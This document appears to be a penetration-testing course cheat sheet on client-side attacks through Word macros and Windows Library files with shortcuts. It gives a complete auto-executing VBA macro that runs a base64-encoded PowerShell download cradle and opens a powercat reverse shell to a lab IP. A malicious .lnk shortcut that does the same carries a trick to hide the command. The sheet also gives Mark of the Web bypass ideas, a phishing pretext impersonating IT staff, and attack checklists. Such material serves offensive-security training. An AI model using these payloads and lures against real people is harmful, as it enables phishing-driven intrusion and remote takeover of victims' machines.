# Client-Side Attacks - Cheat Sheet & Walkthrough

## Table of Contents
1. [Microsoft Office Macro Attacks](#1-microsoft-office-macro-attacks)
2. [Windows Library Files & Shortcuts](#2-windows-library-files--shortcuts)
3. [Quick Reference](#3-quick-reference)

---

## 1. Microsoft Office Macro Attacks

### 1.1 Attack Considerations

#### Mark of the Web (MotW)
- Windows NTFS file attribute
- Set when files are downloaded from the internet
- Triggers Protected View in Office applications
- Blocks macros from running automatically

| Zone | ZoneId | Description |
|------|--------|-------------|
| Local Machine | 0 | Trusted |
| Local Intranet | 1 | Semi-trusted |
| Trusted Sites | 2 | Trusted |
| Internet | 3 | **Most suspicious** |
| Restricted Sites | 4 | Blocked |

#### Protected View
- Opens Office documents in read-only mode
- Disables editing and modification
- Blocks macro execution
- Shows "Enable Editing" banner

#### New Microsoft Macro Blocking (2022+)
**Old Behavior**:
```
Open Document → "Enable Content" Button → Macros Run
```

**New Behavior**:
```
Open Document → "Learn More" Button → Need to Unblock file properties → Macros Run
```

**Unblocking Process**:
1. Right-click file → Properties
2. Check "Unblock" checkbox
3. Click OK
4. Reopen document

#### MOTW Bypass Techniques
1. **Use alternative file formats** (ISO/IMG containers)
2. **Exploit CVE-2022-41091** (bypasses MotW)
3. **Deliver via USB** (no MotW)
4. **Use older Office versions**
5. **Target misconfigured GPOs**

---

### 1.2 Installing Microsoft Office

#### Connect via RDP
```bash
# xfreerdp (supports NLA)
xfreerdp /u:offsec /p:lab /v:192.168.X.X

# Alternative: rdesktop (no NLA support for non-domain)
rdesktop -u offsec -p lab 192.168.X.X
```

#### Installation Steps
1. Navigate to `C:\tools\Office2019.img`
2. Double-click to mount as virtual CD
3. Run `Setup.exe`
4. Complete installation
5. Launch Word, accept license agreements

**Office 2019 Components**:
- Word
- Excel
- PowerPoint
- Outlook
- Publisher
- Access
- **OneNote**

---

### 1.3 Creating Malicious Word Macros

#### VBA Macro Structure

**Basic Macro Skeleton**:
```vba
Sub MyMacro()
    ' Code here
End Sub
```

**Auto-Execute Macros**:
| Macro Name | Trigger |
|------------|---------|
| `AutoOpen()` | Runs when document opens |
| `Document_Open()` | Runs when document opens |
| `AutoExec()` | Runs when Word starts |
| `AutoClose()` | Runs when document closes |

#### Simple Macro (Launch PowerShell)
```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

#### Steps to Create Macro

1. **Save as .doc** (or .docm)
   - `.docx` cannot save macros persistently
   - `.doc` (legacy) or `.docm` (macro-enabled) required

2. **Open Macro Editor**:
   - View → Macros → Enter name → Create

3. **Select Document**:
   - Choose current document in "Macros in" dropdown
   - Prevents macro from saving to global template

4. **Write VBA Code**:
   - Use `AutoOpen()` and `Document_Open()`
   - Call custom macro function

5. **Save and Test**:
   - Save document
   - Reopen → Enable Content → Check execution

---

### 1.4 Reverse Shell via Word Macro

#### Step 1: Prepare PowerCat Payload
```bash
# Serve powercat.ps1
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 8000

# Start listener
nc -nvlp 4444
```

#### Step 2: Base64 Encode PowerShell Command
```powershell
# Command to encode
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```

**Encode on Kali**:
```bash
pwsh
PS> $Text = 'IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.119.2/powercat.ps1");powercat -c 192.168.119.2 -p 4444 -e powershell'
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText = [Convert]::ToBase64String($Bytes)
PS> $EncodedText
```

#### Step 3: Split Encoded String (VBA 255 char limit)
```python
# Python script to split into 50-char chunks
str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA..."
n = 50

for i in range(0, len(str), n):
    print('Str = Str + "' + str[i:i+n] + '"')
```

#### Step 4: Full Malicious Macro
```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
    Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
    Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ' ... continue for all chunks ...
    Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
    Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
    Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```

#### Step 5: Execute
1. Save document as `.doc` or `.docm`
2. Start Python web server and Netcat listener
3. Open document
4. Click "Enable Content"
5. Reverse shell received!

---

## 2. Windows Library Files & Shortcuts

### 2.1 Windows Library Files (.Library-ms)

#### What Are They?
- XML files that act as virtual folders
- Connect to remote WebDAV/SMB shares
- Double-click to open in Windows Explorer
- Appear as local directories to users

#### Why Effective?
- Many spam filters don't block them
- Users unaware of the file type
- Displays remote content as local
- No MOTW tag on the .lnk file!

---

### 2.2 Setting Up WebDAV Server

#### Install WsgiDAV
```bash
sudo apt install python3-wsgidav
```

#### Create WebDAV Directory
```bash
mkdir /home/kali/webdav
```

#### Start WebDAV Server
```bash
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

**Parameters**:
| Parameter | Purpose |
|-----------|---------|
| `--host=0.0.0.0` | Listen on all interfaces |
| `--port=80` | Standard HTTP port |
| `--auth=anonymous` | No authentication |
| `--root` | Share directory path |

---

### 2.3 Creating the Library File

#### Library File XML Structure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,-34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>http://192.168.119.2</url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```

#### XML Elements Explained

| Element | Purpose | Value |
|---------|---------|-------|
| `<name>` | Display name | `@windows.storage.dll,-34582` |
| `<iconReference>` | Icon to display | `imageres.dll,-1003` (Pictures) |
| `<folderType>` | Explorer view GUID | Documents GUID |
| `<url>` | WebDAV share URL | `http://ATTACKER_IP` |

#### Common Icon Indexes
| Index | Icon |
|-------|------|
| -1002 | Documents |
| -1003 | Pictures |
| -1004 | Music |
| -1005 | Videos |
| -1007 | Downloads |

#### Folder Type GUIDs
| Type | GUID |
|------|------|
| Documents | `{7d49d726-3c21-4f05-99aa-fdc2c9474656}` |
| Pictures | `{b3690e58-e961-423b-b687-386ebfd83239}` |
| Music | `{2112ab0a-c86a-4ffe-a368-0de96e47012e}` |
| Videos | `{5fa96407-7e77-483c-ac93-691d05850de8}` |

---

### 2.4 Creating the Shortcut (.lnk)

#### PowerShell Reverse Shell Shortcut
```
Target: powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"
```

**Create Shortcut**:
1. Right-click Desktop → New → Shortcut
2. Enter PowerShell command
3. Name: `automatic_configuration`
4. Click Finish

#### Hiding Malicious Intent
```
# Use delimiter to push malicious command out of view
powershell.exe -c "IEX(...);powercat ... -e powershell & ping -n 1 127.0.0.1"
```

---

### 2.5 Two-Stage Attack Flow

```
Stage 1: Library File Delivery
    Email/SMB with config.Library-ms
                ↓
    User double-clicks .Library-ms
                ↓
    Windows Explorer opens WebDAV share
                ↓
Stage 2: Shortcut Execution
    User sees automatic_configuration.lnk
                ↓
    User double-clicks .lnk
                ↓
    PowerShell downloads powercat.ps1
                ↓
    Reverse shell established
```

#### Delivery Methods
1. **Email**: Send .Library-ms as attachment
2. **SMB**: Upload to writable share
3. **WebDAV**: Direct access (if already mounted)
4. **USB**: Physical delivery

---

### 2.6 Pretext Example

```
Hello! My name is Dwight, and I'm a new member of the IT Team. 

This week I am completing some configurations we rolled out last week.
To make this easier, I've attached a file that will automatically
perform each step. Could you download the attachment, open the
directory, and double-click "automatic_configuration"? Once you
confirm the configuration in the window that appears, you're all done!

If you have any questions, or run into any problems, please let me
know!
```

---

### 2.7 Complete Attack Setup

#### Terminal 1: WebDAV Server
```bash
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

#### Terminal 2: Python HTTP Server (PowerCat)
```bash
python3 -m http.server 8000
```

#### Terminal 3: Netcat Listener
```bash
nc -nvlp 4444
```

#### Terminal 4: Deliver Library File
```bash
# Upload to SMB share
smbclient //192.168.50.195/share -c 'put config.Library-ms'
```

#### Files Needed in WebDAV Directory
```
/home/kali/webdav/
├── config.Library-ms      # To deliver
└── automatic_configuration.lnk  # Payload
```

---

## 3. Quick Reference

### Commands Quick Reference

```bash
# WebDAV Server
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /path/to/webdav

# Python HTTP Server
python3 -m http.server 8000

# Netcat Listener
nc -nvlp 4444

# RDP Connection
xfreerdp /u:offsec /p:lab /v:192.168.X.X

# SMB Upload
smbclient //192.168.X.X/share -c 'put file.ext'

# PowerShell Base64 Encode
pwsh -c '$Text="command";$Bytes=[System.Text.Encoding]::Unicode.GetBytes($Text);[Convert]::ToBase64String($Bytes)'
```

### VBA Quick Reference

```vba
' Auto-execute macros
Sub AutoOpen()          ' Runs on document open
Sub Document_Open()     ' Runs on document open
Sub AutoExec()          ' Runs on Word start
Sub AutoClose()         ' Runs on document close

' Execute command
CreateObject("Wscript.Shell").Run "command"

' Variable declaration
Dim Str As String
Dim Num As Integer
Dim Obj As Object

' String concatenation
Str = Str + "more text"
```

### File Extensions

| Extension | Purpose |
|-----------|---------|
| `.doc` | Legacy Word (saves macros) |
| `.docm` | Macro-enabled Word |
| `.docx` | Modern Word (no macro save) |
| `.dotm` | Macro-enabled template |
| `.Library-ms` | Windows Library file |
| `.lnk` | Windows Shortcut |

### Attack Checklist

#### Macro Attack
- [ ] Install Office on test machine
- [ ] Save document as .doc or .docm
- [ ] Create `AutoOpen()` and `Document_Open()`
- [ ] Write malicious macro
- [ ] Base64 encode PowerShell payload
- [ ] Split encoded string (255 char limit)
- [ ] Test on local machine
- [ ] Deliver to target
- [ ] Wait for "Enable Content" click

#### Library File Attack
- [ ] Install WsgiDAV
- [ ] Create WebDAV share directory
- [ ] Start WebDAV server
- [ ] Create .Library-ms XML file
- [ ] Create malicious .lnk shortcut
- [ ] Place .lnk in WebDAV share
- [ ] Start Python web server (powercat)
- [ ] Start Netcat listener
- [ ] Deliver .Library-ms to target
- [ ] Wait for double-click

### Key Takeaways

| Concept                | Key Point                                                 |
| ---------------------- | --------------------------------------------------------- |
| **Macro Attack**       | Use `AutoOpen()`, save as .doc, handle MOTW               |
| **MOTW**               | Triggers Protected View; use social engineering to bypass |
| **PowerShell Payload** | Base64 encode to avoid special chars                      |
| **VBA 255 Limit**      | Split encoded strings into chunks                         |
| **Library Files**      | XML containers for WebDAV shares                          |
| **Two-Stage Attack**   | Library opens WebDAV; shortcut executes payload           |
| **No MOTW on .lnk**    | Shortcuts opened from WebDAV aren't marked!               |
| **WSGI DAV**           | WebDAV server for Kali                                    |